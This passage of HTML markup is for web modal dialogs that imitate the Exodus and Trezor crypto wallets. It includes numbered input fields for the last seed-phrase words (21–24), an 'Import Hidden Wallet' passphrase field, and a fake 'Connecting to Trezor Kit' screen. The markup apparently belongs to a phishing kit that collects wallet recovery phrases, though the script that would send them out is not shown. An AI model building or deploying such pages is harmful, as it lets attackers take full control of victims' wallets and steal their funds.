                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         21
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         22
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         23
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         24
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
               </div>
             </div>
             <div
               class="scwtw-my-2 scwtw-ease-in-out scwtw-transition-all scwtw-duration-400 scwtw-text-start scwtw-opacity-0"
               id="exodus-error-container"
             >
               <span
                 class="font-inter scwtw-text-[#ff5f52] scwtw-font-normal scwtw-text-[14px]"
                 >1 word is invalid or misspelled</span
               >
             </div>
           </div>
           <div
             class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-gap-x-1 scwtw-mt-4"
           >
             <div class="scwtw-w-full">
               <button
                 class="scwtw-w-full scwtw-text-[#ffffff] scwtw-bg-[#202020] dark:scwtw-text-[#ffffff] dark:scwtw-bg-[#ffffff05] scwtw-font-normal font-inter scwtw-text-[15px] scwtw-cursor-pointer scwtw-rounded-[16px] scwtw-h-[48px] hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 disabled:scwtw-opacity-50 disabled:scwtw-cursor-not-allowed"
                 id="exodus-import-button"
               >
                 Continue with a wallet
               </button>
             </div>
           </div>
         </div>
         <div
           id="passphrase-container"
           class="scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-opacity-0 scwtw-hidden scwtw-px-6 scwtw-py-8"
         >
           <div class="scwtw-flex scwtw-items-center scwtw-justify-between">
             <div>
               <svg
                 class="scwtw-h-[35px] scwtw-w-auto"
                 width="249"
                 height="48"
                 viewBox="0 0 249 48"
                 fill="none"
                 xmlns="http://www.w3.org/2000/svg"
               >
                 <path
                   d="M0 24C0 10.745 10.055 0 22.459 0H79.541C91.945 0 102 10.745 102 24C102 37.255 91.945 48 79.541 48H22.459C10.055 48 0 37.255 0 24Z"
                   fill="#202020"
                 ></path>
                 <path
                   d="M70.1064 29.874V18.786H72.0644V20.458C72.7684 19.226 74.1984 18.5 75.7824 18.5C78.1804 18.5 79.8524 20.018 79.8524 22.966V29.874H77.9164V23.076C77.9164 21.14 76.8164 20.128 75.2104 20.128C73.4724 20.128 72.0644 21.514 72.0644 23.472V29.874H70.1064ZM57.7614 29.874L55.7154 18.786H57.5634L59.0154 27.938L60.9294 21.91H62.7554L64.6474 27.872L66.1214 18.786H67.9694L65.9234 29.874H63.7234L61.8534 24.11L59.9614 29.874H57.7614ZM49.1134 30.16C45.7474 30.16 43.7674 27.652 43.7674 24.33C43.7674 21.03 45.7474 18.5 49.1134 18.5C52.4794 18.5 54.4594 21.03 54.4594 24.33C54.4594 27.652 52.4794 30.16 49.1134 30.16ZM49.1134 28.532C51.5334 28.532 52.4574 26.464 52.4574 24.308C52.4574 22.174 51.5334 20.128 49.1134 20.128C46.6934 20.128 45.7694 22.174 45.7694 24.308C45.7694 26.464 46.6934 28.532 49.1134 28.532ZM36.8424 30.16C33.5864 30.16 31.5404 27.674 31.5404 24.33C31.5404 21.008 33.5864 18.5 36.8424 18.5C39.5924 18.5 42.0124 20.062 41.7484 24.836H33.5424C33.6964 26.882 34.6424 28.554 36.8424 28.554C38.3164 28.554 39.2844 27.652 39.6144 26.618H41.5504C41.2424 28.466 39.5044 30.16 36.8424 30.16ZM33.5864 23.362H39.8564C39.7024 21.14 38.6684 20.106 36.8424 20.106C34.8404 20.106 33.8504 21.558 33.5864 23.362ZM22.1484 29.874V18.786H24.1504V20.656C24.8544 19.424 26.0644 18.786 27.3184 18.786H29.9804V20.656H27.1644C25.4044 20.656 24.1504 21.8 24.1504 24.022V29.874H22.1484Z"
                   fill="white"
                 ></path>
                 <path
                   d="M115.496 16.6H117.938L120.82 24.608L123.702 16.6H126.144V32H124.208V19.966L121.7 26.632H119.94L117.432 19.966V32H115.496V16.6ZM132.879 32.286C131.764 32.286 130.862 31.9853 130.173 31.384C129.498 30.7827 129.161 29.9907 129.161 29.008C129.161 27.864 129.542 27.05 130.305 26.566C131.082 26.0673 132.05 25.7447 133.209 25.598L135.585 25.29C135.995 25.246 136.274 25.1213 136.421 24.916C136.567 24.7107 136.641 24.454 136.641 24.146V24.124C136.641 23.552 136.435 23.09 136.025 22.738C135.629 22.386 135.035 22.21 134.243 22.21C133.436 22.21 132.798 22.3933 132.329 22.76C131.874 23.112 131.603 23.6327 131.515 24.322H129.557C129.674 23.1927 130.151 22.298 130.987 21.638C131.823 20.9633 132.901 20.626 134.221 20.626C135.673 20.626 136.758 20.9707 137.477 21.66C138.21 22.3493 138.577 23.3247 138.577 24.586V29.954C138.577 30.086 138.621 30.196 138.709 30.284C138.797 30.3573 138.907 30.394 139.039 30.394H139.721V32H138.401C137.873 32 137.469 31.8827 137.191 31.648C136.912 31.3987 136.773 31.0613 136.773 30.636V30.372C136.318 31.0467 135.746 31.538 135.057 31.846C134.367 32.1393 133.641 32.286 132.879 32.286ZM133.385 30.702C134.367 30.702 135.152 30.372 135.739 29.712C136.34 29.052 136.641 28.1793 136.641 27.094V26.324C136.362 26.4707 135.988 26.5807 135.519 26.654L133.583 26.94C132.747 27.072 132.138 27.2993 131.757 27.622C131.375 27.93 131.185 28.3627 131.185 28.92C131.185 29.4773 131.383 29.9173 131.779 30.24C132.175 30.548 132.71 30.702 133.385 30.702ZM143.287 20.912H145.245V22.584C145.597 21.968 146.103 21.4913 146.763 21.154C147.438 20.802 148.171 20.626 148.963 20.626C150.195 20.626 151.178 21.0147 151.911 21.792C152.659 22.5547 153.033 23.6547 153.033 25.092V32H151.097V25.202C151.097 24.2633 150.848 23.5373 150.349 23.024C149.865 22.5107 149.212 22.254 148.391 22.254C147.819 22.254 147.291 22.4007 146.807 22.694C146.323 22.9727 145.942 23.3687 145.663 23.882C145.384 24.3807 145.245 24.9527 145.245 25.598V32H143.287V20.912ZM161 32.286C159.768 32.286 158.778 31.9047 158.03 31.142C157.296 30.3647 156.93 29.2573 156.93 27.82V20.912H158.888V27.71C158.888 28.6633 159.13 29.3967 159.614 29.91C160.098 30.4087 160.758 30.658 161.594 30.658C162.166 30.658 162.686 30.5187 163.156 30.24C163.64 29.9467 164.021 29.5433 164.3 29.03C164.593 28.5167 164.74 27.9447 164.74 27.314V20.912H166.676V32H164.74V30.328C164.373 30.944 163.86 31.428 163.2 31.78C162.54 32.1173 161.806 32.286 161 32.286ZM173.806 32.286C172.692 32.286 171.79 31.9853 171.1 31.384C170.426 30.7827 170.088 29.9907 170.088 29.008C170.088 27.864 170.47 27.05 171.232 26.566C172.01 26.0673 172.978 25.7447 174.136 25.598L176.512 25.29C176.923 25.246 177.202 25.1213 177.348 24.916C177.495 24.7107 177.568 24.454 177.568 24.146V24.124C177.568 23.552 177.363 23.09 176.952 22.738C176.556 22.386 175.962 22.21 175.17 22.21C174.364 22.21 173.726 22.3933 173.256 22.76C172.802 23.112 172.53 23.6327 172.442 24.322H170.484C170.602 23.1927 171.078 22.298 171.914 21.638C172.75 20.9633 173.828 20.626 175.148 20.626C176.6 20.626 177.686 20.9707 178.404 21.66C179.138 22.3493 179.504 23.3247 179.504 24.586V29.954C179.504 30.086 179.548 30.196 179.636 30.284C179.724 30.3573 179.834 30.394 179.966 30.394H180.648V32H179.328C178.8 32 178.397 31.8827 178.118 31.648C177.84 31.3987 177.7 31.0613 177.7 30.636V30.372C177.246 31.0467 176.674 31.538 175.984 31.846C175.295 32.1393 174.569 32.286 173.806 32.286ZM174.312 30.702C175.295 30.702 176.08 30.372 176.666 29.712C177.268 29.052 177.568 28.1793 177.568 27.094V26.324C177.29 26.4707 176.916 26.5807 176.446 26.654L174.51 26.94C173.674 27.072 173.066 27.2993 172.684 27.622C172.303 27.93 172.112 28.3627 172.112 28.92C172.112 29.4773 172.31 29.9173 172.706 30.24C173.102 30.548 173.638 30.702 174.312 30.702ZM183.775 30.394H188.065V18.206H184.567V16.6H190.023V30.394H194.291V32H183.775V30.394ZM211.302 16.6H213.304V24.52L219.728 16.6H222.148L216.846 22.936L222.412 32H220.168L215.526 24.52L213.304 27.204V32H211.302V16.6ZM224.835 30.35H228.971V22.562H225.275V20.912H230.973V30.35H235.087V32H224.835V30.35ZM228.883 16.6H231.083V19.02H228.883V16.6ZM244.329 32C243.376 32 242.672 31.7947 242.217 31.384C241.763 30.9587 241.535 30.2913 241.535 29.382V22.518H238.235V20.912H241.029C241.176 20.912 241.293 20.868 241.381 20.78C241.484 20.692 241.535 20.5747 241.535 20.428V17.238H243.471V20.912H247.849V22.518H243.471V29.118C243.471 29.5287 243.574 29.844 243.779 30.064C243.985 30.2693 244.322 30.372 244.791 30.372H248.333V32H244.329Z"
                   fill="#202020"
                 ></path>
               </svg>
             </div>
             <div>
               <button
                 class="scwtw-p-1 scwtw-rounded-[12px] hover:scwtw-bg-[#f3f3f3] dark:hover:scwtw-bg-[#eaeaea0d] scwtw-transition-all scwtw-duration-300 active:scwtw-scale-95"
                 type="button"
                 id="exodus-close-button2"
               >
                 <svg
                   class="scwtw-w-6 scwtw-h-6 scwtw-text-[#202020] dark:scwtw-text-[#ffffff]"
                   xmlns="http://www.w3.org/2000/svg"
                   width="24"
                   height="24"
                   viewBox="0 0 24 24"
                   fill="none"
                   stroke="currentColor"
                   stroke-width="2"
                   stroke-linecap="round"
                   stroke-linejoin="round"
                 >
                   <path d="M18 6 6 18"></path>
                   <path d="m6 6 12 12"></path>
                 </svg>
               </button>
             </div>
           </div>
           <div class="scwtw-mt-6">
             <div
               class="scwtw-flex scwtw-flex-col scwtw-items-start scwtw-justify-start scwtw-text-start scwtw-gap-y-1.5"
             >
               <div>
                 <h3
                   class="scwtw-text-[#202020] dark:scwtw-text-[#ffffff] font-inter scwtw-font-bold scwtw-text-[22px]"
                 >
                   Import Hidden Wallet
                 </h3>
               </div>
               <div class="scwtw-mb-1.5">
                 <p
                   class="scwtw-text-[#141618] dark:scwtw-text-[#dddddd] font-inter scwtw-font-normal scwtw-text-[16px]"
                 >
                   Enter passphrase to authenticate to your hidden wallet.
                   This input can be empty.
                 </p>
               </div>
             </div>
           </div>
           <div class="scwtw-mt-4">
             <div class="scwtw-relative scwtw-w-full">
               <input
                 class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-px-[20px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter exodus-passphrase-input"
                 type="text"
               />
             </div>
           </div>
           <div
             class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-gap-x-1 scwtw-mt-4"
           >
             <div class="scwtw-w-full">
               <button
                 class="scwtw-w-full scwtw-text-[#ffffff] scwtw-bg-[#202020] dark:scwtw-text-[#ffffff] dark:scwtw-bg-[#ffffff05] scwtw-font-normal font-inter scwtw-text-[15px] scwtw-cursor-pointer scwtw-rounded-[16px] scwtw-h-[48px] hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 disabled:scwtw-opacity-50 disabled:scwtw-cursor-not-allowed"
                 type="button"
                 id="exodus-import-passphrase-button"
               >
                 Import Hidden Wallet
               </button>
             </div>
           </div>
         </div>
       </div>
     </div>
   </div>
 </div>




    <!-- trezzor -->

    <div
      id="trezor-modal-overlay"
      style="display: none"
      class="trezor-modal-overlay scwtw-fixed scwtw-inset-0 scwtw-w-full scwtw-h-full scwtw-bg-[#12121280] scwtw-transition-opacity scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-auto scwtw-z-[2147483647] scwtw-opacity-100"
    ></div>
    <div
      id="trezor-modal"
      style="display: none"
      class="trezor-modal connect-modal-parent scwtw-fixed scwtw-inset-0 scwtw-transition-all scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-none scwtw-z-[2147483648] scwtw-opacity-100"
    >
      <div
        class="trezor-modal-content scwtw-pointer-events-auto scwtw-flex scwtw-transition-all scwtw-duration-200 scwtw-ease-in-out scwtw-fixed scwtw-top-1/2 scwtw-left-1/2 -scwtw-translate-x-1/2 scwtw-w-full scwtw-h-full scwtw-max-full md:scwtw-top-1/2 md:scwtw-left-1/2 md:-scwtw-translate-x-1/2 md:-scwtw-translate-y-1/2 md:scwtw-max-w-[620px] md:scwtw-h-[550px] scwtw-rounded-[24px] scwtw-bg-[#ffffff] dark:scwtw-bg-[#121313] dark:scwtw-border dark:scwtw-border-[#292929] md:scwtw-overflow-y-hidden scwtw-overflow-y-auto -scwtw-translate-y-1/2"
      >
        <div class="scwtw-h-full scwtw-w-full">
          <div class="scwtw-relative scwtw-z-[2147483649] scwtw-h-full">
            <div
              id="trezor-container"
              class="scwtw-h-full scwtw-w-full scwtw-absolute scwtw-flex scwtw-flex-col scwtw-transition-opacity scwtw-duration-500 scwtw-z-[2147483648] scwtw-opacity-0 scwtw-hidden"
            >
              <div
                class="scwtw-flex-1 scwtw-flex scwtw-items-center scwtw-justify-center"
              >
                <div
                  class="scwtw-relative scwtw-flex scwtw-flex-col scwtw-items-center"
                >
                  <div class="scwtw-relative">
                    <div class="scwtw-relative scwtw-rounded-2xl scwtw-p-6">
                      <svg
                        class="scwtw-w-28 scwtw-h-28 scwtw-object-contain trezor-loading-image"
                        width="100"
                        height="100"
                        viewBox="0 0 100 100"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <rect
                          width="100"
                          height="100"
                          rx="13"
                          fill="#0F6148"
                        ></rect>
                        <g clip-path="url(#clip0_0_1)">
                          <path
                            d="M50.4976 22C42.7377 22 36.4578 28.3281 36.4578 36.1475V41.4498C33.7328 41.9469 31 42.6096 31 43.4696V71.1413C31 71.1413 31 71.9066 31.8535 72.2697C34.9465 73.5321 47.1148 77.8717 49.9104 78.866C50.2705 79.0001 50.3723 79.0001 50.4663 79.0001C50.5994 79.0001 50.6621 79.0001 51.0222 78.866C53.8177 77.8718 66.0174 73.5321 69.1104 72.2697C69.9012 71.9382 69.9326 71.1729 69.9326 71.1729V43.4696C69.9326 42.6096 67.239 41.9153 64.5062 41.4498V36.1475C64.5453 28.3281 58.2262 22 50.4976 22ZM50.4976 28.7621C55.0705 28.7621 57.8347 31.5474 57.8347 36.1554V40.7632C52.7058 40.4003 48.3286 40.4003 43.1684 40.7632V36.1554C43.1684 31.5395 45.9325 28.7621 50.4976 28.7621ZM50.4663 47.549C56.8481 47.549 62.204 48.0461 62.204 48.9377V66.2017C62.204 66.47 62.1727 66.5015 61.9377 66.5963C61.7107 66.6988 51.0536 70.5729 51.0536 70.5729C51.0536 70.5729 50.6229 70.7072 50.4976 70.7072C50.3645 70.7072 49.9416 70.5414 49.9416 70.5414C49.9416 70.5414 39.2846 66.6672 39.0574 66.5648C38.8304 66.4621 38.7912 66.4305 38.7912 66.1701V48.9061C38.7285 48.0145 44.0846 47.549 50.4663 47.549Z"
                            fill="white"
                          ></path>
                        </g>
                        <defs>
                          <clipPath id="clip0_0_1">
                            <rect
                              width="39"
                              height="57"
                              fill="white"
                              transform="translate(31 22)"
                            ></rect>
                          </clipPath>
                        </defs>
                      </svg>
                    </div>
                  </div>
                  <p
                    class="scwtw-mt-6 scwtw-text-[#202020] font-inter scwtw-font-normal dark:scwtw-text-[#ffffff] scwtw-text-[20px] connecting-loading-text"
                  >
                    Connecting to Trezor Kit
                  </p>
                </div>
              </div>
              <div
                class="scwtw-pb-8 scwtw-flex scwtw-items-center scwtw-justify-center"
              >
                <svg
                  class="scwtw-h-6 scwtw-w-auto"
                  width="494"
                  height="48"
                  viewBox="0 0 494 48"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M245 24C245 10.745 255.055 0 267.459 0H324.541C336.945 0 347 10.745 347 24C347 37.255 336.945 48 324.541 48H267.459C255.055 48 245 37.255 245 24Z"
                    fill="#202020"
                  ></path>
                  <path
                    d="M315.106 29.874V18.786H317.064V20.458C317.768 19.226 319.198 18.5 320.782 18.5C323.18 18.5 324.852 20.018 324.852 22.966V29.874H322.916V23.076C322.916 21.14 321.816 20.128 320.21 20.128C318.472 20.128 317.064 21.514 317.064 23.472V29.874H315.106ZM302.761 29.874L300.715 18.786H302.563L304.015 27.938L305.929 21.91H307.755L309.647 27.872L311.121 18.786H312.969L310.923 29.874H308.723L306.853 24.11L304.961 29.874H302.761ZM294.113 30.16C290.747 30.16 288.767 27.652 288.767 24.33C288.767 21.03 290.747 18.5 294.113 18.5C297.479 18.5 299.459 21.03 299.459 24.33C299.459 27.652 297.479 30.16 294.113 30.16ZM294.113 28.532C296.533 28.532 297.457 26.464 297.457 24.308C297.457 22.174 296.533 20.128 294.113 20.128C291.693 20.128 290.769 22.174 290.769 24.308C290.769 26.464 291.693 28.532 294.113 28.532ZM281.842 30.16C278.586 30.16 276.54 27.674 276.54 24.33C276.54 21.008 278.586 18.5 281.842 18.5C284.592 18.5 287.012 20.062 286.748 24.836H278.542C278.696 26.882 279.642 28.554 281.842 28.554C283.316 28.554 284.284 27.652 284.614 26.618H286.55C286.242 28.466 284.504 30.16 281.842 30.16ZM278.586 23.362H284.856C284.702 21.14 283.668 20.106 281.842 20.106C279.84 20.106 278.85 21.558 278.586 23.362ZM267.148 29.874V18.786H269.15V20.656C269.854 19.424 271.064 18.786 272.318 18.786H274.98V20.656H272.164C270.404 20.656 269.15 21.8 269.15 24.022V29.874H267.148Z"
                    fill="white"
                  ></path>
                  <path
                    d="M360.496 16.6H362.938L365.82 24.608L368.702 16.6H371.144V32H369.208V19.966L366.7 26.632H364.94L362.432 19.966V32H360.496V16.6ZM377.879 32.286C376.764 32.286 375.862 31.9853 375.173 31.384C374.498 30.7827 374.161 29.9907 374.161 29.008C374.161 27.864 374.542 27.05 375.305 26.566C376.082 26.0673 377.05 25.7447 378.209 25.598L380.585 25.29C380.995 25.246 381.274 25.1213 381.421 24.916C381.567 24.7107 381.641 24.454 381.641 24.146V24.124C381.641 23.552 381.435 23.09 381.025 22.738C380.629 22.386 380.035 22.21 379.243 22.21C378.436 22.21 377.798 22.3933 377.329 22.76C376.874 23.112 376.603 23.6327 376.515 24.322H374.557C374.674 23.1927 375.151 22.298 375.987 21.638C376.823 20.9633 377.901 20.626 379.221 20.626C380.673 20.626 381.758 20.9707 382.477 21.66C383.21 22.3493 383.577 23.3247 383.577 24.586V29.954C383.577 30.086 383.621 30.196 383.709 30.284C383.797 30.3573 383.907 30.394 384.039 30.394H384.721V32H383.401C382.873 32 382.469 31.8827 382.191 31.648C381.912 31.3987 381.773 31.0613 381.773 30.636V30.372C381.318 31.0467 380.746 31.538 380.057 31.846C379.367 32.1393 378.641 32.286 377.879 32.286ZM378.385 30.702C379.367 30.702 380.152 30.372 380.739 29.712C381.34 29.052 381.641 28.1793 381.641 27.094V26.324C381.362 26.4707 380.988 26.5807 380.519 26.654L378.583 26.94C377.747 27.072 377.138 27.2993 376.757 27.622C376.375 27.93 376.185 28.3627 376.185 28.92C376.185 29.4773 376.383 29.9173 376.779 30.24C377.175 30.548 377.71 30.702 378.385 30.702ZM388.287 20.912H390.245V22.584C390.597 21.968 391.103 21.4913 391.763 21.154C392.438 20.802 393.171 20.626 393.963 20.626C395.195 20.626 396.178 21.0147 396.911 21.792C397.659 22.5547 398.033 23.6547 398.033 25.092V32H396.097V25.202C396.097 24.2633 395.848 23.5373 395.349 23.024C394.865 22.5107 394.212 22.254 393.391 22.254C392.819 22.254 392.291 22.4007 391.807 22.694C391.323 22.9727 390.942 23.3687 390.663 23.882C390.384 24.3807 390.245 24.9527 390.245 25.598V32H388.287V20.912ZM406 32.286C404.768 32.286 403.778 31.9047 403.03 31.142C402.296 30.3647 401.93 29.2573 401.93 27.82V20.912H403.888V27.71C403.888 28.6633 404.13 29.3967 404.614 29.91C405.098 30.4087 405.758 30.658 406.594 30.658C407.166 30.658 407.686 30.5187 408.156 30.24C408.64 29.9467 409.021 29.5433 409.3 29.03C409.593 28.5167 409.74 27.9447 409.74 27.314V20.912H411.676V32H409.74V30.328C409.373 30.944 408.86 31.428 408.2 31.78C407.54 32.1173 406.806 32.286 406 32.286ZM418.806 32.286C417.692 32.286 416.79 31.9853 416.1 31.384C415.426 30.7827 415.088 29.9907 415.088 29.008C415.088 27.864 415.47 27.05 416.232 26.566C417.01 26.0673 417.978 25.7447 419.136 25.598L421.512 25.29C421.923 25.246 422.202 25.1213 422.348 24.916C422.495 24.7107 422.568 24.454 422.568 24.146V24.124C422.568 23.552 422.363 23.09 421.952 22.738C421.556 22.386 420.962 22.21 420.17 22.21C419.364 22.21 418.726 22.3933 418.256 22.76C417.802 23.112 417.53 23.6327 417.442 24.322H415.484C415.602 23.1927 416.078 22.298 416.914 21.638C417.75 20.9633 418.828 20.626 420.148 20.626C421.6 20.626 422.686 20.9707 423.404 21.66C424.138 22.3493 424.504 23.3247 424.504 24.586V29.954C424.504 30.086 424.548 30.196 424.636 30.284C424.724 30.3573 424.834 30.394 424.966 30.394H425.648V32H424.328C423.8 32 423.397 31.8827 423.118 31.648C422.84 31.3987 422.7 31.0613 422.7 30.636V30.372C422.246 31.0467 421.674 31.538 420.984 31.846C420.295 32.1393 419.569 32.286 418.806 32.286ZM419.312 30.702C420.295 30.702 421.08 30.372 421.666 29.712C422.268 29.052 422.568 28.1793 422.568 27.094V26.324C422.29 26.4707 421.916 26.5807 421.446 26.654L419.51 26.94C418.674 27.072 418.066 27.2993 417.684 27.622C417.303 27.93 417.112 28.3627 417.112 28.92C417.112 29.4773 417.31 29.9173 417.706 30.24C418.102 30.548 418.638 30.702 419.312 30.702ZM428.775 30.394H433.065V18.206H429.567V16.6H435.023V30.394H439.291V32H428.775V30.394ZM456.302 16.6H458.304V24.52L464.728 16.6H467.148L461.846 22.936L467.412 32H465.168L460.526 24.52L458.304 27.204V32H456.302V16.6ZM469.835 30.35H473.971V22.562H470.275V20.912H475.973V30.35H480.087V32H469.835V30.35ZM473.883 16.6H476.083V19.02H473.883V16.6ZM489.329 32C488.376 32 487.672 31.7947 487.217 31.384C486.763 30.9587 486.535 30.2913 486.535 29.382V22.518H483.235V20.912H486.029C486.176 20.912 486.293 20.868 486.381 20.78C486.484 20.692 486.535 20.5747 486.535 20.428V17.238H488.471V20.912H492.849V22.518H488.471V29.118C488.471 29.5287 488.574 29.844 488.779 30.064C488.985 30.2693 489.322 30.372 489.791 30.372H493.333V32H489.329Z"
                    fill="#202020"
                  ></path>
                  <path
                    d="M0.628 11.8H10.708C12.124 11.8 13.408 12.124 14.56 12.772C15.712 13.396 16.612 14.296 17.26 15.472C17.908 16.624 18.232 17.944 18.232 19.432C18.232 20.92 17.908 22.24 17.26 23.392C16.612 24.544 15.712 25.444 14.56 26.092C13.408 26.716 12.124 27.028 10.708 27.028H3.904V37H0.628V11.8ZM10.096 24.328C11.536 24.328 12.676 23.884 13.516 22.996C14.38 22.084 14.812 20.896 14.812 19.432C14.812 17.944 14.38 16.756 13.516 15.868C12.676 14.98 11.536 14.536 10.096 14.536H3.904V24.328H10.096ZM31.4842 37.468C28.4842 37.468 26.1562 36.352 24.5002 34.12C22.8442 31.888 22.0162 28.648 22.0162 24.4C22.0162 20.152 22.8442 16.912 24.5002 14.68C26.1562 12.448 28.4842 11.332 31.4842 11.332C34.4842 11.332 36.8122 12.448 38.4682 14.68C40.1242 16.912 40.9522 20.152 40.9522 24.4C40.9522 28.648 40.1242 31.888 38.4682 34.12C36.8122 36.352 34.4842 37.468 31.4842 37.468ZM31.4842 34.624C33.5722 34.624 35.0962 33.772 36.0562 32.068C37.0402 30.34 37.5322 27.784 37.5322 24.4C37.5322 21.016 37.0402 18.472 36.0562 16.768C35.0962 15.04 33.5722 14.176 31.4842 14.176C29.3962 14.176 27.8602 15.04 26.8762 16.768C25.9162 18.472 25.4362 21.016 25.4362 24.4C25.4362 27.784 25.9162 30.34 26.8762 32.068C27.8602 33.772 29.3962 34.624 31.4842 34.624ZM43.8724 11.8H47.1124L48.9484 31.384L52.2964 18.676H55.3924L58.7404 31.348L60.5044 11.8H63.7444L61.0804 37H57.4804L53.8444 23.032L50.1364 37H46.5724L43.8724 11.8ZM68.1407 11.8H84.7007V14.572H71.4167V22.492H83.2247V25.156H71.4167V34.228H84.7007V37H68.1407V11.8ZM89.9249 11.8H99.5369C101.001 11.8 102.309 12.1 103.461 12.7C104.637 